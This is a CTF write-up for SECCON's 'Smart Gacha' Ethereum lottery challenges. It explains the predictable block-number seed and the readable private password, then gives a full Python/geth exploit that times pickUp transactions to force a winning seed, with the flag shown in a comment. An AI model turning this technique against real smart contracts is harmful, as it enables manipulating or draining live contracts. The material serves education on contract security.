# Smart Gacha Lv.1 & Smart Gacha Lv.2
Lv.1:

```
Toggle the "getItem" boolean value in "fair lottery contract" to true.
If you are lucky, you have only to press "test luck" button once.
Even if you are not lucky, all you have to do is press the button 1,000,000 times.
```

Lv.2:

```
We don't want to think that you cheated, but we enhance security of the contract.
OK, press "test luck" button to check your luck!
```

Also see [Gacha.sol](Gacha.sol) and [Gacha2.sol](Gacha2.sol).

## Problem

A contract deployed on an Ethereum blockchain provides the functionality of a basic lottery.
A web application calls a check function on the contract and provides the flag if the check returns true.

Unfortunately the lottery function:

1. limits the number of calls to one per block mined, which made getting the flag by chance improbable. By the end of the competition less than 30000 blocks were mined.
2. updated the seed using the formula `seed * blocknumber mod 200000`. The moment the seed becomes an even number there is no way for it to become odd again. Since the winning result was 12345, the contract won't ever be able to win afterwards.

## Attack

### The attack we missed
In both challenges the contract provides functions which let the original deployer change the seed at will. The deployer can also provide a password to the contract to give this capability to other accounts.

Unfortunately we weren't able to make use of this fact. Only after the competition had ended a solver from another team told us that the "private" password in the contract was actually retrievable with the `getStorageAt` function. This was how I guess most people solved the Lv.1 challenge (the attack on the password doesn't work for the second part, since this time the password is hashed).

### The attack that worked

Instead of working with the password and the other functions, we found a way to play directly with the contract seed.

As you can see from the contracts source code, the seed is updated using the currently mined block number. But this is not a great source of randomness: the current block number is both public and easily predictable (they're sequential).

By checking the blockchain with `geth` we noticed that new blocks were mined around every 2-10 seconds.

The crucial breakthrough was realizing that the lottery results weren't random nor fixed. For every new block mined, we can choose if we actually want to trigger the `pickUp` method and update the seed, or skip it. After a few different steps this can lead very different updated seeds.

Thus the attack: we can choose a sequence of seed updates with carefully selected block numbers that ends with the seed having value 12345. Once we find a suitable sequence of block numbers, we just need to call the `pickUp` method multiple times and make sure that each transaction ends up mined in the correct block.
This needs a very little amount of bruteforce (it never took more than one second).

The harder part was scripting the interaction with the website and the blockchain to make `pickUp` transactions at the correct time.

Remember: triggering `pickUp` on an even block number makes the contract seed even, and from that point it's impossible to reach 12345, making the contract useless. Everytime the transaction ends up mined in the wrong block, the whole account has to be discarded.

This attack works on both Lv.1 and Lv.2.

## Exploit

Requirements:

 - There must already be a running geth instance on the same device. The instance must be connected and synching to the challenge's remote Ethereum blockchain, using the config files provided with the challenge.
 - The exploit must be run inside the datadir of the above mentioned geth instance.

Thanks to @mebeim for his help in solving the challenge.

```python
from pwn import *
from subprocess import check_output
import requests
import json
import shutil
import time
import IPython

# context.log_level = 'debug'
# flag = 'SECCON{EthereumUseHashInManyPlaces}'

homeurl = 'http://ether.pwn.seccon.jp/'
regurl = homeurl + 'signup'
etherurl = homeurl + 'api/claimETH'
deployurl = homeurl + 'api/deploy/2'
dataurl = homeurl + 'api/getData/2'
configurl = homeurl + 'connection'
finalurl = homeurl + 'api/testLuck/2'
password = 'password'
delim = 'asdfqwerzxcv'

def step(state, number):
    return (state * number) % 200000

def findsequence(seed, start):
    # breadth first search
    # stop when result == 12345

    # initialize
    queue = {seed: []}
    blockn = start + ((start % 2) + 1) # we only want odd ones
    done = False
    # start exploring
    while not done:
        print blockn - start, len(queue)
        nextqueue = queue.copy()
        for state in queue:
            # check new block for every saved state
            newstate = step(state, blockn)
            #print newstate
            if newstate % 2 == 0:
                # skip
                continue
            if newstate == 12345:
                print 'found'
                print seed, queue[state] + [blockn]
                res = queue[state] + [blockn]
                done = True
                break
            if len(nextqueue[state]) > 3:
                # skip
                # we want a short sequence, to reduce timing errors
                continue
            nextqueue[newstate] = nextqueue[state] + [blockn]
        queue = nextqueue
        blockn += 2
    return res


# sign up
print "Signing up new account"
res = requests.post(regurl, data={'pass':password}, allow_redirects=False)
cookies = res.cookies
print "cookies:", cookies

# collect ether
print "Claiming Ether"
res = requests.get(etherurl, cookies=cookies)
if res.status_code != 200:
    exit(1)
print "done claiming ether"

# deploy lv1
print "Deploying level 2"
res = requests.get(deployurl, cookies=cookies)
if res.status_code != 200:
    exit(1)
print "done deploying"

# get contract address
print "Getting contract address"
res = requests.get(dataurl, cookies=cookies)
data = json.loads(res.text)
contract_addr = data["contractAddr"]
print "contract address:", contract_addr

# download key, save in keystore
print "Downloading key"
res = requests.get(configurl, cookies=cookies, stream=True)
if res.status_code == 200:
    with open('collection.zip', 'wb') as f:
        res.raw.decode_content = True
        shutil.copyfileobj(res.raw, f)
check_output(['unzip', '-q', '-o', 'collection.zip'])
check_output(['cp', 'prv.key', 'keystore/prv.key'])
print "done downloading key"

# open geth
print "Opening geth"
# command = ['geth', '--datadir', '.', 'init', 'genesis.json']
# check_output(command)
command = ['geth', 'attach', 'geth.ipc']
p = process(command)
print "opened interactive session"

# create contract variable
print "Creating conract variable"
command = 'var gachaContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"_seed","type":"uint256"}],"name":"initSeed","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"played","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pickUp","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"lastHash","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"player","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_password","type":"bytes"}],"name":"checkPassword","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"seed","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"getItem","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_password","type":"bytes"}],"name":"changeOwner","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_password","type":"bytes32"},{"name":"_seed","type":"uint256"},{"name":"_player","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"}]);'
print command
p.sendline(command)

# connect contract with address
print "Connecting contract with address"
command = 'var gacha2 = gachaContract.at("{}")'.format(contract_addr)
print command
p.sendline(command)

# define function that makes transactions at the correct block number
print "Defining function"
command = 'function func(myarray) { var cur = 0; function checkblock() { var fail = false; if (web3.eth.blockNumber == myarray[cur]) {console.log("=== picking up ===");  gacha2.pickUp(); cur++;} else if (web3.eth.blockNumber > myarray[cur]) {   console.log("TOO LATE!"); fail = true;  } if (cur == myarray.length) console.log("Go get the flag!");  else if (!fail) setTimeout(checkblock, 10); } checkblock();}'
print command
p.sendline(command)


account_ok = False
while not account_ok:
    time.sleep(1)

    # set default account
    print "Setting default account"
    command = 'eth.defaultAccount = web3.personal.listAccounts[0]'
    print command
    p.sendline(command)

    command = 'console.log("{}")'.format(delim)
    p.sendline(command)
    p.recvuntil(delim)

    # unlock account
    print "Unlocking account"
    command = 'web3.personal.unlockAccount(eth.defaultAccount, "{}", 0)'.format(password)
    print command
    p.sendline(command)

    command = 'console.log("{}")'.format(delim)
    p.sendline(command)
    res = p.recvuntil(delim)
    if 'true' in res:
        account_ok = True
        print 'account ok!!'

# get block number
print "Getting block number"
command = 'console.log("{}" + web3.eth.blockNumber)'.format(delim)
print command
p.sendline(command)
p.recvuntil(delim)
blocknum = int(p.recvuntil('\n').strip())
print "block number:", blocknum

# compute list of block numbers at which to trigger the check
print "Finding good sequence"
wholeseq = findsequence(11, blocknum + 4)
print wholeseq

# get list of block numbers at which we need to submit the transaction
funcseq = [x-1 for x in wholeseq[:-1]]
print funcseq

# start javascript function that automatically submits transactions
print "Starting function"
command = ("func({})".format(funcseq))
print command
p.sendline(command)

# print sequence of seed values
print "Values to check:"
start = 11
for x in wholeseq:
    start = step(start, x)
    print start

prog1 = log.progress('blocknum')
lastseed = 11

last = wholeseq[-1]
while blocknum < last - 5:
    # sleep a little, wait for the end
    time.sleep(0.5)
    command = 'console.log("{}" + gacha2.seed())'.format(delim)
    p.sendline(command)
    res = p.recvuntil(delim)
    seed = int(p.recvuntil('\n').strip())
    if seed != lastseed:
        print seed
        lastseed = seed
    command = 'console.log("{}" + web3.eth.blockNumber)'.format(delim)
    p.sendline(command)
    res = p.recvuntil(delim)
    blocknum = int(p.recvuntil('\n').strip())
    prog1.status(str(blocknum))
while blocknum < last - 1:
    # accelerate
    time.sleep(0.1)
    command = 'console.log("{}" + web3.eth.blockNumber)'.format(delim)
    p.sendline(command)
    res = p.recvuntil(delim)
    blocknum = int(p.recvuntil('\n').strip())
    prog1.status(str(blocknum))

# we reached the correct block number, do the web request
print 'FINAL!'
res = requests.get(finalurl, cookies=cookies)

# retrieve flag
print 'getting flag?'
res = requests.get(dataurl, cookies=cookies)
data = json.loads(res.text)
flag = data["flag"]
print 'FLAG', flag

IPython.embed()
```

